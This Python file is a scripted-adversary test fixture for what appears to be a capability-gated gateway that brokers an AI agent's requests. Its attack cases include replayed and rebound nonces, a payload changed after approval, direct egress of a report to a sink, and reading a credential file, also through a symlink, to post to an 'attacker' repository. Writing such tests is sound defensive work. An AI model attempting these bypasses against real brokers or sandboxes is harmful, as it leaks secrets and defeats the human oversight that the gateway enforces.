"""Scripted adversary; accesses only paths/endpoints in its disposable fixture job."""

import copy
import json
import os
from pathlib import Path
import socket
import subprocess
import sys
import time
from urllib.request import Request, ProxyHandler, build_opener
from urllib.error import HTTPError


def http(url, body, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    request = Request(url, data=json.dumps(body).encode(), headers=headers, method="POST")
    try:
        response = build_opener(ProxyHandler({})).open(request, timeout=2)
    except HTTPError as error:
        response = error
    with response:
        return response.status


def send(path, envelope, reorder=False, timeout=3):
    with socket.socket(socket.AF_UNIX) as connection:
        connection.settimeout(timeout)
        connection.connect(path)
        data = json.dumps(envelope, sort_keys=reorder).encode() + b"\n"
        connection.sendall(data)
        with connection.makefile("rb") as stream:
            return json.loads(stream.readline(65537))


def main(job):
    case = job["case"]
    if case == "broker_workflow":
        responses = []
        for request in job["requests"]:
            envelope = {"request": request, "capability": None}
            responses.append(send(job["gateway"], envelope, timeout=job.get("request_timeout", 3)))
        return {"responses": responses}
    if case in {"subprocess", "subprocess_attack", "deferred_attack"}:
        child_job = dict(job, case="changed_payload" if case != "subprocess" else "clean")
        if case == "deferred_attack":
            time.sleep(0.05)
        child = subprocess.run([sys.executable, "-I", __file__], input=json.dumps(child_job),
                               text=True, capture_output=True, timeout=8, check=True)
        return {"child": json.loads(child.stdout)}
    envelope = copy.deepcopy(job["envelope"])
    request, capability = envelope["request"], envelope["capability"]
    report = Path(job["report"])
    if case == "changed_payload":
        report.write_text("UNAPPROVED report replacement\n")
    request["args"]["body"]["body"] = report.read_text()
    if case in {"credential_file", "symlink_credential"}:
        credential = Path(job["credential"])
        if case == "symlink_credential":
            link = report.parent / "credential-link"
            link.symlink_to(credential)
            credential = link
        secret = credential.read_text()
        return {"direct_status": http(job["backend"] + "/repos/pome-agent/attacker/issues",
                                      {"title": "stolen fixture credential", "body": "fixture bypass"}, secret)}
    if case == "direct_egress":
        return {"direct_status": http(job["sink"], {"body": report.read_text()})}
    if case in {"wrong_project"}:
        request["args"]["path"] = "/repos/pome-agent/attacker/issues"
    if case == "wrong_method":
        request["args"] = {"method": "DELETE", "path": "/repos/acme/api", "body": {}}
    if case == "missing_capability":
        envelope["capability"] = None
        request["args"]["path"] = "/repos/pome-agent/attacker/issues"
    if case == "identity_rebinding":
        request.update(run_id="team", request_id="alpha|read|nonce")
        capability.update(run_id=request["run_id"], request_id=request["request_id"])
    results = [send(job["gateway"], envelope, case == "reordered_json")]
    if case in {"replay", "nonce_rebinding", "lost_response_retry"}:
        if case == "nonce_rebinding":
            request["request_id"] = "read"
            capability.update(request_id="read", nonce="nonce|n")
        if case == "lost_response_retry":
            results[0] = {"status": None, "reason": "caller discards committed response"}
        results.append(send(job["gateway"], envelope))
    return {"responses": results}


if __name__ == "__main__":
    job = json.loads(sys.stdin.read(65537))
    try:
        outcome = main(job)
    except (OSError, ValueError, subprocess.SubprocessError) as error:
        outcome = {"error": type(error).__name__, "errno": getattr(error, "errno", None)}
    outcome["namespaces"] = {k: os.readlink("/proc/self/ns/" + k) for k in ("net", "pid", "mnt")}
    print(json.dumps(outcome))
